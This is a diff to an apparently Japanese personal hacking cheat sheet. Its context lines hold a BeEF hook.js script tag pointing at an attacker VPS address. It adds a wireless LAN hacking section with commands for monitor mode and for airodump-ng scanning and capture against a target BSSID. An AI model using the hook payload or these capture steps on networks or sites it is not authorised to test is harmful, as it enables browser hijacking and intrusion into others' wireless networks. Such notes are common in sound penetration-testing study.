@@ -493,3 +493,43 @@ sudo beef-xss
 # 実践的にはVPS経由となる
 # <script src="http://[VPSのIP]:3000/hook.js"></script>
 ```
+
+## 無線LANハッキング
+
+```bash
+# ネットワークアダプタの認識を確認
+ifconfig
+# ドライバ名、チップセットを表示
+sudo airmon-ng
+# Mode確認
+iwconfig [インターフェース名]
+# APスキャン
+iwlist [インターフェース名] scan | grep [SSID]
+```
+
+```bash
+# Monitorモードに切り替え
+sudo ifconfig [インターフェース名] down
+sudo iwconfig [インターフェース名] mode monitor
+sudo ifconfig [インターフェース名] up
+
+# Managedモードに戻す
+sudo ifconfig [インターフェース名] down
+sudo iwconfig [インターフェース名] mode managed
+sudo ifconfig [インターフェース名] up
+
+sudo ifconfig wlan1 down
+sudo iwconfig wlan1 mode monitor
+sudo ifconfig wlan1 up
+
+# MonitorモードでAPスキャン
+sudo airodump-ng wlan1
+```
+
+```bash
+# 接続状態を確認
+iw [インターフェース名] link
+
+# 解析に必要な情報を調べる
+sudo airodump-ng --channel [CH] --bssid [BSSID] --write [生成ファイルの接頭辞] [インターフェース名]
+```
